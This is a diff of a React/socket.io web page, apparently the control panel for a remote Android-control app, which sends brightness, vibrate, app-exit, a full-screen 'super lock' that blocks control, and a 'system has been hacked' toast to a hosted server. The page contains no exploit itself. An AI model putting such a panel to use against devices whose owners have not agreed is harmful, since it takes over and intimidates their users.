@@ -10,147 +10,126 @@
     <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@600;900&display=swap');
+        body { font-family: 'Cairo', sans-serif; background: #0f172a; color: white; }
         
-        body { font-family: 'Cairo', sans-serif; background: #020617; overflow-x: hidden; }
-
-        /* شريط الألوان المتحرك اللانهائي */
-        .rainbow-bar {
-            height: 4px;
+        /* شريط الألوان المتحرك */
+        .rainbow-line {
+            height: 3px;
             width: 100%;
             background: linear-gradient(90deg, #ff0000, #ff7f00, #ffff00, #00ff00, #0000ff, #4b0082, #8b00ff, #ff0000);
             background-size: 200% 100%;
-            animation: moveBar 3s linear infinite;
+            animation: moveRainbow 2s linear infinite;
+            border-radius: 3px 3px 0 0;
         }
 
-        @keyframes moveBar {
-            0% { background-position: 100% 0; }
-            100% { background-position: -100% 0; }
+        @keyframes moveRainbow {
+            0% { background-position: 0% 0; }
+            100% { background-position: 200% 0; }
         }
 
-        .neo-box {
-            background: rgba(30, 41, 59, 0.5);
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(56, 189, 248, 0.2);
-            transition: all 0.3s ease;
+        .neo-card {
+            background: #1e293b;
+            border-radius: 15px;
+            overflow: hidden;
+            border: 1px solid #334155;
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.3);
+            transition: transform 0.2s;
         }
-
-        .neo-box:hover {
-            border-color: #22d3ee;
-            box-shadow: 0 0 20px rgba(34, 211, 238, 0.1);
-            transform: translateY(-2px);
-        }
+        .neo-card:active { transform: scale(0.98); }
     </style>
 </head>
-<body class="min-h-screen">
+<body>
     <div id="root"></div>
 
     <script type="text/babel">
         const { useState, useEffect } = React;
+        const socket = io("https://158e4726-c90f-4be8-b3aa-6bed2b55b805-00-188ey3m9mpgr0.picard.replit.dev/");
 
-        // رابط السيرفر الخاص بك
-        const SERVER_URL = "https://158e4726-c90f-4be8-b3aa-6bed2b55b805-00-188ey3m9mpgr0.picard.replit.dev/";
-        const socket = io(SERVER_URL);
+        const ControlButton = ({ title, desc, icon, color, onClick }) => (
+            <div className="neo-card mb-4">
+                <div className="rainbow-line"></div>
+                <div className="p-4 flex items-center justify-between">
+                    <div>
+                        <h3 className="font-bold text-lg">{title}</h3>
+                        <p className="text-slate-400 text-xs">{desc}</p>
+                    </div>
+                    <button 
+                        onClick={onClick}
+                        className={`${color} text-white px-6 py-3 rounded-xl font-black shadow-lg transition-all active:opacity-80`}
+                    >
+                        {icon}
+                    </button>
+                </div>
+            </div>
+        );
 
-        const RemotePanel = () => {
-            const [status, setStatus] = useState("جاري فحص الاتصال...");
-            const [brightness, setBrightness] = useState(128);
+        const App = () => {
+            const [bright, setBright] = useState(150);
 
-            useEffect(() => {
-                socket.on("connect", () => setStatus("النظام متصل ونشط ✅"));
-                socket.on("connect_error", () => setStatus("فشل الاتصال بالسيرفر ❌"));
-            }, []);
-
-            const send = (action, value = "") => {
-                socket.emit("send_command", { action, value });
-            };
+            const send = (action, value = "") => socket.emit("send_command", { action, value });
 
             return (
-                <div className="flex flex-col items-center">
-                    {/* شريط الألوان المتحرك */}
-                    <div className="rainbow-bar fixed top-0 left-0 z-50"></div>
-
-                    <div className="w-full max-w-lg mt-12 p-6">
-                        {/* الهيدر والكريديت */}
-                        <div className="text-center mb-10">
-                            <span className="text-cyan-400 text-3xl font-black mb-2 block tracking-tighter uppercase">
-                                &lt;/&gt;
-                            </span>
-                            <h2 className="text-white text-lg font-extrabold uppercase tracking-widest mb-1">
-                                Developed by: **OMAR ABD EL-TAWAB SALEH**
-                            </h2>
-                            <div className="h-1 w-20 bg-cyan-500 mx-auto rounded-full mb-4"></div>
-                            <p className="text-slate-400 text-xs font-mono bg-slate-800/50 py-1 px-3 rounded-full inline-block">
-                                {status}
-                            </p>
-                        </div>
-
-                        <div className="grid grid-cols-1 gap-4">
-                            
-                            {/* بوكس السطوع */}
-                            <div className="neo-box p-5 rounded-3xl">
-                                <label className="flex justify-between text-cyan-400 text-sm font-bold mb-4">
-                                    <span>التحكم في الإضاءة</span>
-                                    <span>{Math.round((brightness/255)*100)}%</span>
-                                </label>
-                                <input 
-                                    type="range" min="0" max="255" value={brightness} 
-                                    onChange={(e) => {
-                                        setBrightness(e.target.value);
-                                        send('set_brightness', e.target.value);
-                                    }}
-                                    className="w-full h-1.5 bg-slate-700 rounded-lg appearance-none cursor-pointer accent-cyan-400"
-                                />
-                            </div>
-
-                            {/* بوكس القفل (الأدمن) */}
-                            <div className="neo-box p-4 rounded-3xl flex items-center justify-between">
-                                <div className="text-right">
-                                    <h3 className="text-white font-bold">حماية النظام</h3>
-                                    <p className="text-slate-500 text-[10px]">قفل الشاشة فوراً عبر Device Admin</p>
-                                </div>
-                                <button onClick={() => send('lock_phone')} className="bg-red-500/10 hover:bg-red-500 border border-red-500/50 text-red-500 hover:text-white p-4 rounded-2xl transition-all font-black shadow-lg shadow-red-500/20">
-                                    🔒 LOCK
-                                </button>
-                            </div>
-
-                            {/* بوكس الاهتزاز */}
-                            <div className="neo-box p-4 rounded-3xl flex items-center justify-between">
-                                <div className="text-right">
-                                    <h3 className="text-white font-bold">تنبيه الجهاز</h3>
-                                    <p className="text-slate-500 text-[10px]">تشغيل وضع الهزاز القوي</p>
-                                </div>
-                                <button onClick={() => send('vibrate', '1000')} className="bg-cyan-500/10 hover:bg-cyan-500 border border-cyan-500/50 text-cyan-400 hover:text-white p-4 rounded-2xl transition-all font-black">
-                                    📳 VIBRATE
-                                </button>
-                            </div>
-
-                            {/* بوكس فتح اليوتيوب */}
-                            <div className="neo-box p-4 rounded-3xl flex items-center justify-between">
-                                <div className="text-right">
-                                    <h3 className="text-white font-bold">الوسائط</h3>
-                                    <p className="text-slate-500 text-[10px]">فتح تطبيق YouTube تلقائياً</p>
-                                </div>
-                                <button onClick={() => send('openApp', 'com.google.android.youtube')} className="bg-blue-500/10 hover:bg-blue-500 border border-blue-500/50 text-blue-400 hover:text-white p-4 rounded-2xl transition-all font-black px-8">
-                                    📺 OPEN
-                                </button>
-                            </div>
-
-                            {/* بوكس الإغلاق */}
-                            <button onClick={() => send('exitApp')} className="mt-4 text-slate-600 hover:text-red-400 text-xs font-bold transition-colors">
-                                تدمير الجلسة وإغلاق التطبيق ⛔
-                            </button>
-
-                        </div>
-
-                        <footer className="mt-12 text-center">
-                            <p className="text-[10px] text-slate-700 font-mono tracking-widest">ENCRYPTED SOCKET BRIDGE v2.0</p>
-                        </footer>
+                <div className="max-w-md mx-auto p-6">
+                    {/* الهيدر */}
+                    <div className="text-center mb-8">
+                        <div className="text-cyan-400 text-4xl mb-2 font-black">&lt;/&gt;</div>
+                        <h1 className="text-xl font-black uppercase tracking-widest">
+                            Developed by: **OMAR ABD EL-TAWAB SALEH**
+                        </h1>
+                        <p className="text-slate-500 text-sm mt-1">تم التطوير بواسطة عمر عبد التواب صالح</p>
                     </div>
+
+                    {/* بوكس السطوع */}
+                    <div className="neo-card mb-6 p-4">
+                        <div className="rainbow-line mb-4" style={{marginTop: '-16px', marginLeft: '-16px', marginRight: '-16px'}}></div>
+                        <label className="block text-cyan-400 text-sm font-bold mb-2">التحكم بالسطوع: {Math.round((bright/255)*100)}%</label>
+                        <input type="range" min="0" max="255" value={bright} 
+                            onChange={(e) => { setBright(e.target.value); send('set_brightness', e.target.value); }}
+                            className="w-full h-2 bg-slate-700 rounded-lg appearance-none cursor-pointer accent-cyan-400" 
+                        />
+                    </div>
+
+                    {/* الأزرار في بوكسات مستقلة */}
+                    <ControlButton 
+                        title="القفل الخارق" desc="تغطية الشاشة بالكامل ومنع التحكم" 
+                        icon="💀 SUPER LOCK" color="bg-red-600" 
+                        onClick={() => send('super_lock')} 
+                    />
+
+                    <ControlButton 
+                        title="فك القفل" desc="إزالة الغطاء الأسود وإعادة الجهاز" 
+                        icon="🔓 UNLOCK" color="bg-green-600" 
+                        onClick={() => send('unlock_phone')} 
+                    />
+
+                    <ControlButton 
+                        title="تنبيه الجهاز" desc="تشغيل الهزاز بقوة 1 ثانية" 
+                        icon="📳 VIBRATE" color="bg-blue-600" 
+                        onClick={() => send('vibrate', '1000')} 
+                    />
+
+                    <ControlButton 
+                        title="رسالة توست" desc="إرسال رسالة تنبيه سريعة" 
+                        icon="💬 TOAST" color="bg-amber-600" 
+                        onClick={() => send('toast', 'تم اختراق النظام')} 
+                    />
+
+                    <ControlButton 
+                        title="إغلاق السيرفر" desc="إنهاء الجلسة وإغلاق التطبيق" 
+                        icon="⛔ EXIT" color="bg-slate-700" 
+                        onClick={() => send('exitApp')} 
+                    />
+
+                    <footer className="text-center mt-10 text-slate-600 text-[10px] tracking-widest uppercase">
+                        Master Control System v3.0
+                    </footer>
                 </div>
             );
         };
 
-        ReactDOM.createRoot(document.getElementById('root')).render(<RemotePanel />);
+        const root = ReactDOM.createRoot(document.getElementById('root'));
+        root.render(<App />);
     </script>
 </body>
 </html>
+
